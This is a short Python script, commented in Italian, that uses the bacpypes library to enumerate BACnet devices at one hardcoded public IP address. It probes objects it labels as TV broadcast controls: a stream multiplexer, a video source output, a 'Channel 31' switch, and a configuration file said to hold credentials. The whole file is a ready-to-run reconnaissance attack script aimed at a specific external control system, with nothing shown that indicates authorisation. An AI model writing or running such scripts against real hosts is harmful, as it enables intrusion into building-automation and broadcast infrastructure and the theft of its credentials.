from bacpypes.core import run
from bacpypes.app import BIPSimpleApplication
from bacpypes.local.device import LocalDeviceObject
from bacpypes.pdu import Address
from bacpypes.apdu import WhoIsRequest, ReadPropertyRequest, IAmRequest
from bacpypes.primitivedata import ObjectIdentifier, Unsigned
import sys

class EnumApp(BIPSimpleApplication):
    def __init__(self, *args):
        super().__init__(*args)
        self.target = Address("67.224.88.86:47808")
        self.do_whois()
    
    def do_whois(self):
        """Scopri tutti i dispositivi nella rete BBMD"""
        whois = WhoIsRequest()
        whois.pduDestination = self.target
        self.request(whois)
    
    def do_IAmRequest(self, apdu):
        """Salva dispositivi scoperti"""
        print(f"📡 Dispositivo trovato: {apdu.iAmDeviceIdentifier} @ {apdu.pduSource}")
        self.enum_device(apdu.iAmDeviceIdentifier)
    
    def enum_device(self, device_id):
        """Enumerazione oggetti critici per TV broadcast"""
        objects_to_enum = [
            ('analogValue', 200001, 'AV-STREAM_MUX'),      # Stream multiplexer
            ('analogOutput', 200010, 'AO-VIDEO_SOURCE'),   # Video source control  
            ('binaryOutput', 100001, 'BO-CHANNEL31'),      # Channel 31 switch
            ('fileAccess', 300001, 'FA-CONFIG_DUMP'),      # Config file (credenziali)
        ]
        
        for obj_type, instance, desc in objects_to_enum:
            oid = ObjectIdentifier(obj_type, instance)
            req = ReadPropertyRequest(
                destination=self.target,
                objectIdentifier=oid,
                propertyIdentifier='objectName'
            )
            print(f"🔍 Enumerando {desc} ({oid})...")
            self.request(req)

this_device = LocalDeviceObject(
    objectName='Pentest-Enum',
    objectIdentifier=9999,
    maxApduLengthAccepted=1024,
    segmentationSupported='segmentedBoth',
    vendorIdentifier=15,
)

this_app = EnumApp(this_device, '0.0.0.0:47809')
print("🚀 Avvio enumerazione BACnet su 67.224.88.86:47808...")
print("Controlla output per oggetti stream CHANNEL 31")
run()
